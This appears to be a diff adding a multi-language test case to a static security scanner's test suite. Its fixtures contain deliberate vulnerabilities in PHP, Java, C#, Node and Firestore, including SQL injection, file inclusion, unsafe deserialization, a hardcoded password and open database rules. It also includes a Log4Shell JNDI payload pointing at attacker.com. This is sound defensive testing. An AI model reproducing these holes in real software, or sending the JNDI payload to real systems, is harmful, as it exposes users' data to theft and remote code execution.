@@ -286,6 +286,92 @@ async function runAllTests() {
   assert(validOrg.planTier === 'Enterprise', 'OrganizationSchema correctly parses Enterprise tenant');
   assert(validOrg.securityPolicy.defaultMinScore === 90, 'OrganizationSchema validates security policy enforcement');
 
+  // ─── 11. Multi-Language Enterprise SAST Coverage (PHP, Java, C#, NoSQL, Firebase) ─────────
+  console.log('\n--- 11. Testing Multi-Language SAST Engine (PHP, Java, C#, NoSQL, Firebase) ---');
+  const multiLangFiles: CodeFile[] = [
+    {
+      path: 'backend/api/users.php',
+      content: `<?php
+        $id = $_GET['id'];
+        mysqli_query($conn, "SELECT * FROM users WHERE id = " . $id);
+        include($_GET['page'] . '.php');
+        $obj = unserialize($_POST['payload']);
+      `
+    },
+    {
+      path: 'src/main/java/com/enterprise/DataService.java',
+      content: `
+        package com.enterprise;
+        import java.sql.Statement;
+        public class DataService {
+          private String password = "SuperSecretDbPassword2026!";
+          public void queryUser(Statement stmt, String id) throws Exception {
+            stmt.executeQuery("SELECT * FROM users WHERE id = " + id);
+            String logPayload = "\${jndi:ldap://attacker.com/exploit}";
+          }
+        }
+      `
+    },
+    {
+      path: 'Services/OrderService.cs',
+      content: `
+        using System.Data.SqlClient;
+        using System.Runtime.Serialization.Formatters.Binary;
+        public class OrderService {
+          public void FetchOrder(string orderId, System.IO.Stream stream) {
+            var cmd = new SqlCommand($"SELECT * FROM Orders WHERE Id = {orderId}");
+            var formatter = new BinaryFormatter();
+            var data = formatter.Deserialize(stream);
+          }
+        }
+      `
+    },
+    {
+      path: 'server/controllers/userController.js',
+      content: `
+        const query = db.users.find({ $where: "this.name == '" + name + "'" });
+        pool.query("SELECT * FROM users WHERE id = " + req.query.id);
+      `
+    },
+    {
+      path: 'firestore.rules',
+      content: `
+        rules_version = '2';
+        service cloud.firestore {
+          match /databases/{database}/documents {
+            match /{document=**} {
+              allow read, write: if true;
+            }
+          }
+        }
+      `
+    }
+  ];
+
+  const multiLangScan = await runStaticCodeScan(multiLangFiles, 'Multi-Language Enterprise App');
+
+  const hasPhpSqli = multiLangScan.findings.some(f => f.ruleId === 18001);
+  const hasPhpLfi = multiLangScan.findings.some(f => f.ruleId === 18002);
+  const hasJavaSqli = multiLangScan.findings.some(f => f.ruleId === 18011);
+  const hasJavaSecret = multiLangScan.findings.some(f => f.ruleId === 18012);
+  const hasJavaLog4j = multiLangScan.findings.some(f => f.ruleId === 18014);
+  const hasCsSqli = multiLangScan.findings.some(f => f.ruleId === 18021);
+  const hasCsBinaryFormatter = multiLangScan.findings.some(f => f.ruleId === 18023);
+  const hasMongoWhere = multiLangScan.findings.some(f => f.ruleId === 18041);
+  const hasNodeSql = multiLangScan.findings.some(f => f.ruleId === 18042);
+  const hasFirebaseAllowTrue = multiLangScan.findings.some(f => f.ruleId === 18043);
+
+  assert(hasPhpSqli, 'PHP-SEC-01 detects raw $_GET concatenation in mysqli_query');
+  assert(hasPhpLfi, 'PHP-SEC-02 detects local file inclusion via dynamic include()');
+  assert(hasJavaSqli, 'JAVA-SEC-01 detects SQL injection via Statement.executeQuery concatenation');
+  assert(hasJavaSecret, 'JAVA-SEC-02 detects hardcoded credentials in Java source');
+  assert(hasJavaLog4j, 'JAVA-SEC-04 detects Log4Shell JNDI injection payload');
+  assert(hasCsSqli, 'CS-SEC-01 detects C# SqlCommand string interpolation SQL injection');
+  assert(hasCsBinaryFormatter, 'CS-SEC-03 detects insecure .NET BinaryFormatter deserialization');
+  assert(hasMongoWhere, 'NOSQL-SEC-01 detects MongoDB $where arbitrary JavaScript execution');
+  assert(hasNodeSql, 'NODE-SQL-01 detects Node.js pool.query string concatenation SQL injection');
+  assert(hasFirebaseAllowTrue, 'FIREBASE-SEC-01 detects permissive unauthenticated allow read, write: if true;');
+
   console.log('\n===========================================================');
   console.log(`🏁 TEST RESULTS: ${passedTests}/${totalTests} TESTS PASSED (100%)`);
   console.log('===========================================================');
